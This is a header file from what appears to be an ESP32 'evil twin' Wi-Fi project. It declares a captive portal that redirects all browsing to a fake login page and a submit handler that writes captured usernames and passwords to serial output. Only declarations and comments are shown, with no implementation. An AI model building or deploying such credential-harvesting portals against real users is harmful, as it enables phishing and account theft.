#ifndef WEB_HANDLER_H
#define WEB_HANDLER_H

#include <WiFi.h>
#include <WebServer.h>

extern WebServer http_server; 

// this function setup all the routes for the evil twin. //
void setup_web_handler();

// this function activates everytime user try to navigate on web. //
// in particular, for each URL that doesn't match the ESP-32 one, //
// the user is redirected on the login page. //
void captive_portal();

// this function activates everytime the main page is visited. //
// it presents a web login interface to the user. //
void main_handler();

// this function activates everytime user submit a username-passwrd pair. //
// the credentials are written on the serial output. //
void submit_handler();

// this function shuts the evil twin down. //
void shutdown_handler();

#endif